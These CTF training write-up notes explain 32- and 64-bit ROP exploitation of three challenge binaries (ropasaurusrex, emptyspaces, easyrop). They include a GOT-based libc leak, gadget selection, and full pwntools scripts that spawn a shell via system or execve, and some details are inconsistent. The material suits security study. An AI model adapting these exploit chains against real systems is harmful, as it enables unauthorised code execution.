## ROP

### ropasaurusrex (32- bit `ROP` chain)

```assembly
$ pwn checksec ropasaurusrex
[*] '/home/zerocool/chall/solved/ropasaurusrex/ropasaurusrex'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ file ropasaurusrex
ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
```

`main`

```c
int main(void) {
  int res;
  
  vuln();
  res = write(1,&global_buf,4);
  return res;
}
```

`first_func()`

```c
void vuln(void) {
  char buf [136];
  
  read(0,buf,256);
  return;
}
```

#### what do we do?

We have an overflow but we cannot perform a `ROP` exploit since we don't know where `libc` is in memory. Since we cannot print out the stack, we could exploit the `GOT` table to leak the address of `system`. Since the binary is not `PIE`, and the momry addresses of the code are not randomized at runtime, the `GOT` table has a permanent address that can be found with Ghidra. From the previous screenshot we can see the address of `read`: `804961c`, and also the address of `write`. Those two functions alone are enough to read and print to screen the content of the file containing the flag.

**how did we find the address of  `write ` inside the library?**

We search write into Ghidra (`ctrl+shift+e`) and we look for a `jmp` into the `GOT` that has an `<EXTERNAL>::write` parameter. Another way of doing that is using `objdump` and looking for `<write@plt>`:

```shell
objdump -d -M intel ./ropasaurusrex | grep write
```

Note that founding addresses of `GOT` is even easier in gdb:

```assembly
pwndbg> got

GOT protection: No RELRO | GOT functions: 4

[0x8049610] __gmon_start__ -> 0x8048302 (__gmon_start__@plt+6) ◂— push   0 /* 'h' */
[0x8049614] write@GLIBC_2.0 -> 0x8048312 (write@plt+6) ◂— push   8
[0x8049618] __libc_start_main@GLIBC_2.0 -> 0xf7df4e30 (__libc_start_main) ◂— call   0xf7f132c9
[0x804961c] read@GLIBC_2.0 -> 0x8048332 (read@plt+6) ◂— push   0x18
pwndbg>
```

#### `cyclic`

To check how deep are we in the stack we can use `pwn cyclic -n 4 200 | ./ropasaurusrex` which generates a pattern of 4 bytes, 200 chars long (since we are in a 32 bit environment, otherwise we would need a 8 bytes pattern). Then we check with gdb what section of the pattern gets into the instruction pointer (for e.g. gdb would print `Invalid address at 0x6261616b`), and then we can actually see how long must be our padding, by running:

```sh
❯ cyclic -n 4 -l 0x6261616b
140
```

#### leaking `libc`

Since the binary is x86, we need to put call arguments on the stack. We need the following stack layout:

| Before / After                                               |
| ------------------------------------------------------------ |
| ...                                                          |
| **sEBP** / junk                                              |
| **sEIP** / `write` in `PLT` (**what we want to execute**)    |
| Frame of caller / cleaner gadget (cleans up the next three cells and puts a `ret` in order to jump at the address that follows the three stack cells just cleared, which is the address of the `main` |
| Frame of caller / arg #1 (1st argument of what we want to execute, the `fd` of the `write` target) |
| Frame of caller / arg #2 (2nd argument of what we want to execute, what we want to write to `stdout`) |
| Frame of caller / arg #3 (3rd argument of what we want to execute, how much to write) |
| Frame of caller / `main` address (**return address** after that the gadget cleans the stack) |
| ...                                                          |

```python
# STAGE 1
# writing to stdout the address of write, and returning
# a gadget that cleans write's arguments off the stack in order
# to call again the main.
params = [
    e.plt['write'],
    cleaner,
    1,
    e.got['write'],
    4,
    main_addr	# return address, we'll make the binary start again
]							# from the beginning of the main to complete the exploit
exploit = b''
exploit += padding
for p in params:
    exploit += p32(p)
input("[1st stage] press any key to send...")
r.send(exploit)
leak = r.recv()
leak = unpack(leak, 'all', endian='little', sign=False)
sysaddr = leak - write_sys_offset
print('address of system: ' + str(hex(sysaddr)))
```

On top of the stack we have the pointer of the write, the return address (`CCCC`, for now we do not need it), and its parameters. The code above, when assembled into shellcode and executed, will execute a `write` syscall, which will write to `stdout` the address of the `write` itself. How did we tell to the `write` what to print? We passed as argument in the stack (remember x86 calling convention, which unlike x64 uses the stack instead of the register for function arguments) the address of `write` in the `GOT` table, which at runtime corresponds to the address of the same function but in `libc`. This means that since we know the offset of the `write` inside the library, we can compute `libc` base to know the address of `system`, which is the function that we'll use to spawn a shell.

**Note about cleaner gadgets**

```python
e = ELF('./ropasaurusrex')
rop = ROP(e)
libc = ELF("./libc-2.27.so")
write_sys_offset = libc.symbols["write"] - libc.symbols["system"]
binsh_sys_offset = libc.symbols["write"] - next(libc.search(b"/bin/sh"))
cleaner = (rop.find_gadget(['pop esi','pop edi','pop ebp','ret']))[0]
```

This gadget will remove the arguments that we put in the stack to correctly execute the call. It is necessary if we want to execute a `ROP` chain.

#### Spawning a shell

```python
# STAGE 2
# now we will do another rop, but this time
# we will call system with /bin/sh as argument
# binsh is already present in the binary, I found
# its offset using pwntools

print('address of /bin/sh: ' + str(hex(leak+binsh_sys_offset)))
params = [
    sysaddr,
    b'CCCC',
    leak - binsh_sys_offset
]

exploit = b''
exploit += padding
for p in params:
    if type(p) is not int:
        exploit += p
    else:
        exploit += p32(p)
input("[2nd stage] press any key to send...")
r.send(exploit)

input("press any key to spawn a shell...")
r.interactive()
```

### emptyspaces (64-bit ROP chain)

```bash
$ file easyrop
easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped
```

It is statically linked binary, which means that `libc` is already located into the executable itself. That's why Ghidra lists lots of functions in the code. As a consequence, we can look for gadgets directly into the binary:

```python
>>> e = ELF('./emptyspaces')
>>> rop = ROP(e)
>>> rop.find_gadget(['pop rdi','ret'])
>>> Gadget(0x400696, ['pop rdi', 'ret'], ['rdi'], 0x8)
```

Moreover:

```shell
❯ pwn checksec ./emptyspaces
[*] '/home/zerocool/chall/solved/emptyspaces/emptyspaces'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Actually this is weird because there's no canary in the binary.

**Note**: if the program crashes it is useful to do a `dmesg` to obtain additional info about it. As for security measures:

#### the code

`main`

```c
int main(void)

{
  char buf [64];
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  puts("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?");
  read(0,buf,137);
                    /* WARNING: Subroutine does not return */
  empty(buf);
}
```

`empty`:

```c
void empty(char *buf) {
  int i;
  
  for (i = 0; i < 18; i = i + 4) {
    *(undefined4 *)(buf + (long)i * 4) = 0xc3f48948;
  }
  return;
}
```

**Note**:  `empty` does not complicates things, since it just fills some space which would be padding anyway. If for example we fill the buffer with 64 'A' characters, the stack would look like this:

```assembly
pwndbg> x/30gx $rsp
0x7fffffffdf80: 0x00007fffffffe0f8      0x0000000100000002
0x7fffffffdf90: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfa0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfb0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfc0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfd0: 0x00000000c3f48948      0x0000000000401199
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdfe0:
 rip = 0x400c0e in main; saved rip = 0x401199
 called by frame at 0x7fffffffe0e0
 Arglist at 0x7fffffffdfd0, args:
 Locals at 0x7fffffffdfd0, Previous frame's sp is 0x7fffffffdfe0
 Saved registers:
  rbp at 0x7fffffffdfd0, rip at 0x7fffffffdfd8
```

`sEBP` is overwritten, but we do not need it anyway.

#### What to do

We know that we can perform a buffer overflow, but still we need to leak and put on the stack the canary (if present), and execute at least two syscalls: one to read `/bin/sh` and put it in memory, the other one to execute `execve(/bin/sh, 0, 0);`. We also need to find some gadgets to setup the registers to run a syscall. Weirdly `ropper` won't find useful gadgets, while `ROPgadgets` works just fine.

Note that in order to do that we need to restart the execution from main, since the read only takes 137 bytes and our exploit is longer than that. Since the binary is not `PIE`, this is possible without leaking any address at runtime.

#### The exploit

The payload is made up by some padding necessary to reach `sEIP`. Then there is a first payload which is used to call a `read` to put in the heap `/bin/sh`, then we'll pass the string to put it in memory (at an arbitrary address decided by us):

```python
padding = b'A'*64
payload = b''
payload += padding
payload += b'B'*8
params = [
    # read
    pop_rdx_rsi['address'],
    8,
    binsh_addr,
    pop_rdi['address'],
    0,
    syscall_ret['address'],
    main_addr
]
payload += formatter(params)
print('payload (len : {}):\n{}'.format(len(payload), payload))

input('[1] press any key to send the payload...')
sender(payload)

input('press any key to send /bin/sh...')
sender(b'/bin/sh\x00')


```

After the `read` the execution flow is redirected to the `main`. When the program executes again a similar exploit is performed again, this time calling an `execve` which is used to spawn a shell:

```python
payload = b''
payload += padding
payload += b'B'*8
params = [
    # execve
    pop_rdx_rsi['address'],
    zeros_addr,
    zeros_addr,
    pop_rdi['address'],
    binsh_addr,
    pop_rax['address'],
    0x3b,
    syscall['address']
]
payload += formatter(params)
print('payload (len : {}):\n{}'.format(len(payload), payload))

input('[2] press any key to send the payload...')
sender(payload)
```

Source code:

```c
#include <stdio.h>
#include <unistd.h>

void empty(char * buffer){
    for (int i = 0; i<72/4; i+=4)
        *((int *)buffer + i) = 0xc3f48948;
}

int main(int argc, char * argv[]){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    int i;
    char buffer[56];
    printf("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?\n");
    read(0, buffer, 137);
    empty(buffer);

    return 0;
```

### easyrop

#### Initial considerations

```shell
$ file easyrop
easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped
```

64 bit statically linked binary: the calling convention needs us to use register to setup a call to `execve` to spawn a shell. This is the only way since the stack is NX:

```shell
$ checksec --file ./easyrop
RELRO           STACK CANARY      NX            PIE         
No RELRO        No canary found   NX enabled    No PIE       
```

And `system` is not present in the binary. We can perform buffer overflow by filling the stack exploiting the `while` loop in the `main` function. Ghidra disassembled code:

```c
undefined8 main(void)

{
  ssize_t bytes_read;
  int var2;
  int var1;
  int array [12];

  len = 0xc3585a5e5f;
  write(1,"Try easyROP!\n",0xd);
  while (2 < len) {
    len = 0;
    bytes_read = read(0,&var1,4);
    len = len + (int)bytes_read;
    bytes_read = read(0,&var2,4);
    len = len + (int)bytes_read;
    array[index] = var2 + var1;
    index = index + 1;
    write(1,&len,4);
  }
  return 0;
}
```

Basically we can fill up 8 bytes (1 cell) of the buffer in each loop iteration, since no array bound check is performed. Between the beginning of the array and seip there are 56 bytes.

#### The actual exploit

This will be the structure of our exploit:  

| BEFORE VULNERABLE READ | AFTER VULNERABLE READ                      |
| ---------------------- | ------------------------------------------ |
| array[...]             | padding                                    |
| ...                    | ...                                        |
| * array[...] + 48      | padding                                    |
| sebp                   | junk                                       |
| seip                   | g1 address                                 |
| ...                    | 0 (stdin)                                  |
| ...                    | global variable address (/bin/sh location) |
| ...                    | 8 (#bytes to read)                         |
| ...                    | 0 (read syscall code)                      |
| ...                    | g2 address                                 |
| ...                    | junk                                       |
| ...                    | g1 address                                 |
| ...                    | global variable address (/bin/sh location) |
| ...                    | pointer to zero (rsi content)              |
| ...                    | pointer to zero (rdx content)              |
| ...                    | 0x3b (execve syscall code)                 |
| ...                    | g3 address                                 |

Basically we want to perform a read to put '/bin/sh' in memory, and pass it as argument to the execve syscall in order to be able to spawn a shell.

Note that:

* g1 is a gadget that performs the following operations:
  
  `pop rdi, pop rsi, pop rdx, pop rax, ret`

* g2:
  
  `syscall, nop, nop, pop rbp, ret `
  
  We need a syscall gadget that also performs a ret in order to be able to execute another syscall (execve /bin/sh) after the read.

* g3: `syscall`

The newline character of `/bin/sh\x00` makes the syscall fail (it will return -1 in `rax`). Solution: pass the string with `pwntools`. Actual exploit:

```python
#!/usr/bin/python3
from pwn import *
from time import sleep

# global variables
binary = './easyrop'
port = 2015
debug = False
remote_enabled = False
delay = 0.05

# initializing address variables
# note that the binary is statically linked
e = ELF(binary)
index = e.symbols['index']
binsh_addr = index+8
zeros_addr = binsh_addr+8

rop = ROP(e)
magic_gadget = rop.find_gadget(['pop rdi','pop rsi','pop rdx','pop rax','ret'])
syscall = rop.find_gadget(['syscall'])
syscall_ret = rop.find_gadget(['syscall','nop','pop','rbp','ret'])
ret = rop.find_gadget(['ret'])

# checking that everything is all right
print('____________________________________')
print('address of all in one gadget: {} - {}'.format(hex(magic_gadget[0]), p64(int(magic_gadget[0]))))
print('address of syscall: {} - {}'.format(hex(syscall[0]), p64(int(magic_gadget[0]))))
print('address of /bin/sh: {}'.format(hex(binsh_addr)))
print('address of zeros: {}'.format(hex(zeros_addr)))
print('____________________________________')

# trying to minimize replicated code
def sender(payload):
    r.send(payload)
    r.send('\x00'*4)
    print('\n sent: {}'.format(str(payload)))
    print('read {} bytes'.format(str(r.recv())))
    sleep(delay)

# setting up execution environment
context.update(arch='amd64', os='linux')
if debug:
    context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
if remote_enabled:
    r = remote("training.jinblack.it", port)
else:
    r = process(binary)
    gdb.attach(r, '''
        b main
        continue
        b * 0x400290
    ''')

r.recvuntil('Try easyROP!')

# SENDING THE ACTUAL EXPLOIT

# padding to get to sebp
for i in range(12):
    sender(b'AAAA')

# junking sebp
sender(b'BBBB')
sender(b'BBBB')

# reading '/bin/sh' into the .bss section to allow the call to execve

# address of pop gadget
sender(p64(magic_gadget[0]))
sender(b'\x00'*4)

# fd from which we take the input
sender(b'\x00'*4)
sender(b'\x00'*4)

# where to read
sender(p64(binsh_addr))

# how much to read
sender(p64(8))

# syscall code
sender(b'\x00'*4)
sender(b'\x00'*4)

# sycall + ret gadget
sender(b'\x00'*4)
sender(p64(0x00000000004001b3))

# junking next stack cell
sender(b'BBBB')
sender(b'BBBB')

# setting up the stack to spawn the shell

# address of pop gadget
sender(p64(magic_gadget[0]))
sender(b'\x00'*4)

# address of /bin/sh
sender(p64(binsh_addr))

# pointer to zero
sender(p64(zeros_addr))
sender(b'\x00'*4)

# pointer to zero
sender(p64(zeros_addr))

# # syscall code
sender(b'\x3b')
sender(b'\x00'*4)

# syscall gadget address
sender(p64(syscall[0]))
sender(b'\x00'*4)

# breaking the loop
input('[#1] press any key to break the loop...')
r.send(b'A')
sleep(delay)
input('[#2] press any key to break the loop...')
r.send(b'A')
sleep(delay)
input('[#3] press any key to break the loop...')
r.send(b'A')
sleep(delay)

input('press any key to send /bin/sh')
r.send(b'/bin/sh\x00')
sleep(delay)

# hopefully getting a shell
r.interactive()
```
